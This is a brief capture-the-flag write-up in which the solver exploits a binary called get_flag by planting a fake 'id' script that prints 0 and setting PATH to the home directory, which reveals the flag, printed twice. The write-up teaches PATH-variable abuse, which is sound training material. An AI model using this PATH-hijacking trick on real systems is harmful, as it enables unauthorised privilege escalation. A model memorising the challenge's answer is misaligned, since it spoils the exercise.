# Touch No See

## Description

Type the following command to connect to the challenge:
`nc <remote ip> <port>`

## Solution

```bash
user@8f1e40c8841f:/home/user$ printf '#!/bin/bash\n/bin/echo 0\n' > id
user@8f1e40c8841f:/home/user$ chmod +x id
user@8f1e40c8841f:/home/user$ PATH=/home/user ./get_flag
omu{Th3_PATH_to_hacking_stardom!}
```

## Learning Outcome

Learn about abusing `PATH` variable.
File permissions and stuff.

## Flag

`omu{Th3_PATH_to_hacking_stardom!}`